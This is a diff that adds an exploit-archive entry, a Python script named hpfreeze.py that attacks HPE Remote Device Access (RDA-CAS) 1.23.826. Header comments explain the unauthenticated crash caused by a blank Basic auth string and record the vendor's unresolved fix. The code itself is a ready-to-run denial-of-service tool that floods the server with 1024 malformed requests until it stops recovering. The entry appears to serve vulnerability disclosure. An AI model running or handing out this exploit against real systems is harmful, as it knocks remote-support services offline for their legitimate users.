@@ -1,0 +1,103 @@
+id: 36469
+date: 06/23/2021
+title: HPE RDA-CAS 1.23.826 Denial Of Service Exploit
+author: Jeremy Brown
+cves: 
+
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+#
+# hpfreeze.py
+#
+# HPE Remote Device Access Unauthenticated Denial of Service
+#
+# Jeremy Brown [jbrown3264/gmail]
+# June 2021
+#
+# "Designed for the enterprise, HPE RDA (Remote Device Access) provides integrated remote
+# connectivity for support automation, device telemetry and remote service delivery."
+#
+# More info: https://midway.ext.hpe.com
+#
+# rda-cas web server could not gracefully handle a blank or malformed BASIC auth string.
+#
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x00007f4693362a5c in rda::base64_decode(std::string const&) () from /lib/librda.so.1
+#
+# Typical NULL ptr deref. It will automatically restart itself after handling one
+# of these malformed requests, but quickly sending many of them will make the server
+# give up on recovery and become unavailable to users. '=' instead of nothing for an
+# auth string will also make it crash in a different parsing routine. The server can
+# be configured at setup to listen on either localhost or the network interface.
+#
+# > ./hpfreeze.py rdacas-host
+# ;p;P;p;P;p;P;p;P;p;P;p;P
+#
+# (If users have the web UI open, they may see "Connection to the RDA-CAS has been lost")
+#
+# Tested
+# - RDA-CAS Version: 1.23.826
+# -- rda-cas_1.23-826+deb10_amd64.deb
+#
+# Fix
+# - "the issue will be remediated in an imminent release" with no further reply
+#
+
+import sys
+import argparse
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+DEFAULT_PORT = 8082
+HOW_MANY_TIMES = 1024
+
+class HPFreeze(object):
+  def __init__(self, args):
+    self.target = args.target
+
+  def run(self):
+    target = "https://" + self.target + ':' + str(DEFAULT_PORT)
+
+    session = requests.Session()
+    session.verify = False
+
+    # rocket science
+    headers = {'Authorization':"Basic"}
+
+    for i in range(HOW_MANY_TIMES):
+      try:
+        resp = session.post(target + "/", headers=headers)
+      except Exception as error:
+        if('RemoteDisconnected' in str(error)):
+          print(";p;P", end='')
+    print()
+
+    return 0
+
+def arg_parse():
+  parser = argparse.ArgumentParser()
+
+  parser.add_argument("target",
+            type=str,
+            help="HPE RDA host")
+
+  args = parser.parse_args()
+
+  return args
+
+def main():
+  args = arg_parse()
+
+  hpf = HPFreeze(args)
+
+  result = hpf.run()
+
+  if(result > 0):
+    sys.exit(-1)
+
+if(__name__ == '__main__'):
+  main()
+
+#  0day.today [2023-03-24]  #
